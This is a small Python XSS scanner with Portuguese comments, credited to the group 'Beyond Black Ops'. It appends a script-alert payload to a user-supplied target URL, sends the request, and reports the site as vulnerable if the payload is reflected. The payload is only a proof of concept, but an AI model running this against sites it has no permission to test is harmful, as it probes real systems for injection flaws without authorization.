# -*- coding: utf-8 -*-
# feito por sir1usbl4ck.
# Beyond Black Ops.
# somos: Froyd, sir1usbl4ck, V3RDAD.
# somos 3 e fazemos oque 10 não dão conta!

import os
import requests
import time
import platform

try:
	os.system("clear||cls")
except:
	print("UNKNOWN SYSTEM.")

so = platform.system()
arch = platform.machine()

def banner():
	print("""
----------------------------------------------------------------------------
██   ██ ███████ ███████  ██████  █████  ███    ██ ███    ██ ███████ ██████  
 ██ ██  ██      ██      ██      ██   ██ ████   ██ ████   ██ ██      ██   ██ 
  ███   ███████ ███████ ██      ███████ ██ ██  ██ ██ ██  ██ █████   ██████  
 ██ ██       ██      ██ ██      ██   ██ ██  ██ ██ ██  ██ ██ ██      ██   ██ 
██   ██ ███████ ███████  ██████ ██   ██ ██   ████ ██   ████ ███████ ██   ██ 
-------------------------| by sir1usbl4ck    |------------------------------
			 |      from	     |
		         | Beyond Black Ops  |
                          -------------------

Sistema Operacional: {}
Arquitetura: {}
""".format(so, arch))
banner()

alvo = input("TARGET ~> ")
payload = "<script>alert('[*] BEYOND BLACK OPS. [*]');</script>"
req = requests.post(alvo + payload)
if payload in req.text:
	print("Vulneravel!!\r\n")
	print("[+] LINK :: {}{}".format(alvo, payload))
else:
	print("O site não está vulneravel.")
